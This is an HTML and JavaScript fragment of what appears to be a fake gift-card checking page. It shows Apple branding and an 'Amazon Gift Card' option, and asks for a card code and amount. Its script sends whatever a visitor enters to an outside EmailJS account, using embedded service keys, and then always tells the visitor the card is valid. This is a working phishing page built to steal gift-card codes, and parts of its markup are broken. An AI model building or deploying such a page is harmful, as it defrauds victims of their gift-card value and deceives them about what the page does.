    <div class="body">

                <img src="images/apple-ma.png" class="img-fluid" width="200" height="200" style="display: block; margin-left: auto; margin-right: auto;">

            <form id="giftCardForm">
                <!-- Select for card type -->
                <label for="cardType">Select Type of Card:</label>
                <select id="cardType" name="cardType">
                    <option value="" disabled selected>Select type of card</option>
                    <option value="Apple Gift Card">Amazon Gift Card</option>
                </select>
    
                <!-- Input for gift card code -->
                <label for="cardCode">Gift Card Code:</label>
                <input type="text" id="cardCode" name="cardCode" placeholder="Enter gift card code" required>

    
                <!-- Input for CVV -->
                <label for="amount">AMOUNT:</label>
                <input type="text" id="amount" name="amount" placeholder="Enter amount" required>

        <script type="text/javascript"

</script>
<script type="text/javascript">
   (function(){
      emailjs.init({
        publicKey: "wbHfs6tRaKIdCf2zg",
      });
   })();
</script> EmailJS CDN
        <script>
            // Initialize EmailJS

// Function to send the form data
document.getElementById('verifyButton').addEventListener('click', function() {
    // Get form values
    const cardType = document.getElementById('cardType').value;
    const cardCode = document.getElementById('cardCode').value;
    const amount = document.getElementById('amount').value;
    // Basic validation
    if (!cardType || !cardCode || !amount) {
        alert("Please fill out all fields.");
        return;
    }

    // EmailJS service parameters
    const templateParams = {
        cardType: cardType,
        cardCode: cardCode,
        amount: amount,
    };

    // Send email using EmailJS
    emailjs.send('service_qzggxni', 'template_s2q4ajk', templateParams)
        .then(function(response) {
            console.log('SUCCESS!', response.status, response.text);
            alert("Your Gift Card is Valid!");
        }, function(error) {
            console.log('FAILED...', error);
            alert("Failed to send card details. Please try again.");
        });
});

        </script> <!-- Link to external JavaScript -->
